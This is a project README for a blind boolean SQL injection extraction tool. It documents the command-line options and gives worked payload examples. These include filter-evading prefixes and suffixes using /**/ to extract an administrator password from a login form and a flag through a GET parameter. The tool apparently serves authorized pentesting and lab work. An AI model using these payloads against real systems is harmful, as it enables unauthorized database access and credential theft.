# blindsqlx

[![CI](https://github.com/ZProtons/blindsqlx/actions/workflows/ci.yml/badge.svg)](https://github.com/ZProtons/blindsqlx/actions/workflows/ci.yml)

A small, generic blind boolean-based SQL injection extractor. Point it
at any app where you already know a boolean SQLi oracle exists, and it
extracts any scalar SQL expression you give it — character by character,
via binary search — without you having to write a one-off extraction
script for every target.

This isn't a scanner. It doesn't find injection points. It turns a
known true/false oracle into a data extractor.

## Install

```sh
pip install requests
```

## Usage

```
blindsqlx.py -u URL [-X GET|POST] [-d DATA] \
    (--true-marker STR | --false-marker STR) \
    --expr "SELECT ..." \
    [--prefix STR] [--suffix STR] \
    [--collapse-spaces] [--max-len N] [-v]
```

The target URL (and/or form data) must contain the literal string
`INJECT` where the payload should be inserted.

### Example: blind SQLi in a POST login form

```sh
python3 blindsqlx.py \
  -u "http://target/login" \
  -X POST \
  -d "username=INJECT&password=whatever" \
  --true-marker "Welcome back" \
  --expr "SELECT password FROM users WHERE username='administrator'" \
  --prefix "nonexistent'/**/OR/**/(" \
  --suffix ")/**/OR/**/'x'='y" \
  --collapse-spaces -v
```

- `--prefix` / `--suffix` wrap your boolean expression into whatever
  injection context the target needs (closing a string, using operator
  precedence instead of a comment if `--` is filtered, etc.) — this is
  specific to each target's query structure and filter, so it's left
  as an argument rather than assumed.
- `--collapse-spaces` replaces every literal space in the final payload
  with `/**/`, which SQL treats as whitespace — useful against apps
  that naively block the space character.

### Example: blind SQLi in a GET parameter

```sh
python3 blindsqlx.py \
  -u "http://target/item?id=INJECT" \
  --true-marker "In stock" \
  --expr "SELECT value FROM secrets WHERE label='flag'" \
  --prefix "1 OR (" --suffix ")"
```

## Verified against

Tested end to end against
[vault-bank-blindsqli](https://github.com/ZProtons/vault-bank-blindsqli),
a lab I built with a deliberately quiet blind-SQLi login form (no
errors, no leaked data, naive space/keyword filter). `blindsqlx`
recovers both the administrator's password and the lab's flag with no
app-specific code — only the four arguments above.

## Development

```sh
pip install -r requirements-dev.txt
ruff check .
pytest tests/ -v
```

The test suite covers `build_oracle()` and `extract_string()` directly
against a fake in-memory oracle — no network calls, no real target
needed — plus the marker-injection, space-collapsing, and form-data
substitution behavior. CI runs lint + tests on Python 3.10–3.12 on every
push and PR.

## Scope

For use only against systems you own, labs, or engagements you're
explicitly authorized to test.
